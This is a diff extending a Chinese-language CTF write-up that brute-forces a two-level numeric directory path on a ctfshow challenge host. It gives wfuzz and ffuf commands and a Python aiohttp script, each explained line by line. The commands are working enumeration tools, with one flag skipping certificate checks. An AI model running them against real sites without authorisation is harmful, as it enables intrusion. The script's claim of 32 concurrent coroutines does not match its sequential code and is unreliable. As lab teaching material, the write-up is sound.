@@ -1506,3 +1506,148 @@ Sniper(狙击手)，Battering ram(攻城锤)，Cluster bomb(集束炸弹)三种�
 5.点 Start attack，跑约 `101×101 ≈ 1万` 次请求。
 
 6.跑完后按 **Status(状态码)** 排序，找到唯一一条 **200**,打开它的 **Response(响应)**，里面就是 flag。
+
+![image-20261104223203597](/assets/ctfshow-web-bruteforce/image-20261104223203597.png)
+
+#### 法2：wfuzz(命令行目录爆破神器)
+
+```
+wfuzz -c -z range,0-100 -z range,0-100 --sc 200 -u "https://xxx.ctf.show/FUZZ/FUZ2Z/"
+```
+
+- `-c` 彩色输出
+- `-z range,0-100` 生成 0~100 的数字字典(两个 `-z` 对应两层目录)
+- `--sc 200` 只显示状态码为 200 的结果（`sc` = show code，即 “只显示（状态码为这些值的）响应”。）
+- `-u` 目标 URL，`FUZZ` 和 `FUZ2Z` 是占位符，分别被两个 `-z` 的字典替换
+
+**Q1：为什么是 `wfuzz` 而不是 `fuzz`？**
+
+> 因为 **`wfuzz` 是工具的名字（命令名），`fuzz` 是「模糊测试」这个概念**。
+>
+> - **fuzz / fuzzing** = 模糊测试，泛指「喂一堆随机/枚举的数据进去，看程序怎么反应」的测试技术，是一个**概念/动作**。
+> - **WFuzz** = 一个具体用 Python 写的**命令行工具**，专门拿来做 Web 的目录/参数爆破。W = Web，表示它面向 Web。装好后你在终端敲的命令就是它的名字 `wfuzz`。
+> - W = Web，wfuzz = Web + fuzz，即 “网页模糊测试器”。
+
+**Q2：为什么第二个是 `FUZ2Z` 而不是 `FUZZ2`？**
+
+> 因为 wfuzz 的**占位符命名规则**是把数字夹在中间：
+>
+> | 第几个注入点 | 占位符  |
+> | :----------- | :------ |
+> | 第 1 个      | `FUZZ`  |
+> | 第 2 个      | `FUZ2Z` |
+> | 第 3 个      | `FUZ3Z` |
+> | 第 4 个      | `FUZ4Z` |
+>
+> 规律就是：**`FUZ` + 数字 + `Z`**。第一个特殊点，没数字，就叫 `FUZZ`；从第二个开始，数字插在 `FUZ` 和 `Z` 中间，所以是 `FUZ2Z`、`FUZ3Z`……而不是 `FUZZ2`。
+
+#### 法3：使用ffuf
+
+首先你需要下载Git Bash,然后进入到Git里
+
+```
+cd "/c/HelloCTF/Toolkit/Web"
+seq 0 100 > nums.txt
+./ffuf.exe -w nums.txt:FUZZ -w nums.txt:FUZ2Z -u "https://<靶机>/FUZZ/FUZ2Z/" -mc 200 -k -t 40
+```
+
+##### 进到工具所在文件夹
+
+```
+cd "/c/HelloCTF/Toolkit/Web"
+```
+
+| 部分                      | 意思                                                         |
+| :------------------------ | :----------------------------------------------------------- |
+| `cd`                      | change directory，**「进入某个文件夹」**                     |
+| `/c/HelloCTF/Toolkit/Web` | 文件夹路径。注意：Git Bash 里 C 盘要写成 `/c/`，而不是 `C:\` |
+| 两边的引号 `"`            | 把路径包起来，防止空格/特殊符号捣乱（这个路径没空格，但养成加引号的习惯更安全） |
+
+**整句意思**：进到 ffuf.exe 所在的文件夹，这样下一步才能直接叫它干活。
+
+##### 造数字字典
+
+```
+seq 0 100 > nums.txt
+```
+
+| 部分       | 意思                                                        |
+| :--------- | :---------------------------------------------------------- |
+| `seq`      | sequence（序列），**「按顺序生成一串数字」**                |
+| `0 100`    | 从 0 开始，到 100 结束（就是 0、1、2、3……100，共 101 个数） |
+| `>`        | **「把输出写到文件里」**（重定向，redirect）                |
+| `nums.txt` | 要生成的文件名                                              |
+
+**整句意思**：生成 0~100 这 101 个数字，每行一个，存进 `nums.txt`。这就是爆破用的「字典（wordlist）」。
+
+##### 真正开始爆破（重点）
+
+```
+./ffuf.exe -w nums.txt:FUZZ -w nums.txt:FUZ2Z -u "https://<靶机>/FUZZ/FUZ2Z/" -mc 200 -k -t 40
+```
+
+| 部分                              | 意思                                                  |
+| :-------------------------------- | :---------------------------------------------------- |
+| `./ffuf.exe`                      | 运行当前文件夹里的 ffuf 程序（`./` 表示「当前目录」） |
+| `-w nums.txt:FUZZ`                | 用 `nums.txt` 当第一份字典，把它交给占位符 **`FUZZ`** |
+| `-w nums.txt:FUZ2Z`               | 用 `nums.txt` 当第二份字典，交给占位符 **`FUZ2Z`**    |
+| `-u "https://<靶机>/FUZZ/FUZ2Z/"` | 目标网址，`-u` = URL                                  |
+| `-mc 200`                         | match code，**只显示状态码为 200 的结果**             |
+| `-k`                              | 跳过 HTTPS 证书校验（省得报证书错误）                 |
+| `-t 40`                           | 开 40 个线程（thread），并发请求，跑得快              |
+
+##### 占位符 FUZZ / FUZ2Z
+
+网址里写了两个「洞」：`FUZZ` 和 `FUZ2Z`。ffuf 会：
+
+- 把 `FUZZ` 换成第一份字典里的每个数（0、1、2…100）
+- 把 `FUZ2Z` 换成第二份字典里的每个数（0、1、2…100）
+- 两两组合，全部试一遍 → `0/0`、`0/1`、`0/2`… 直到 `100/100`，共 101×101 = 10201 个网址
+
+相当于自动帮你访问了 10201 个可能的目录，其中只有一个返回 200，那就是答案。
+
+跑完看到什么
+
+ffuf 会打印一条：
+
+```
+[Status: 200, Size: 45, ...]
+    * FUZ2Z: 20
+    * FUZZ: 72
+```
+
+意思就是：目录 **`/72/20/`** 返回了 200（成功），别的都是 403/302。然后浏览器打开 `https://<靶机>/72/20/` 就能看到 flag。
+
+![image-20261104230809311](/assets/ctfshow-web-bruteforce/image-20261104230809311.png)
+
+![image-20261104230842211](/assets/ctfshow-web-bruteforce/image-20261104230842211.png)
+
+#### 法4：Python aiohttp 异步爆破
+
+用 `aiohttp` 开 32 个协程并发扫，每层 0~100，输出状态码，找到 200 就停：
+
+```
+import asyncio
+import aiohttp
+
+url = 'https://xxx.challenge.ctf.show/{}/{}/'
+
+async def login(a, b):
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get(url=url.format(a, b), ssl=False) as r:
+                print(a, b, r.status)
+                return r.status == 200
+        except Exception as e:
+            print(e)
+            return False
+
+async def main():
+    for a in range(101):
+        for b in range(101):
+            if await login(a, b):
+                print('找到:', a, b)
+                return
+
+asyncio.run(main())
+```
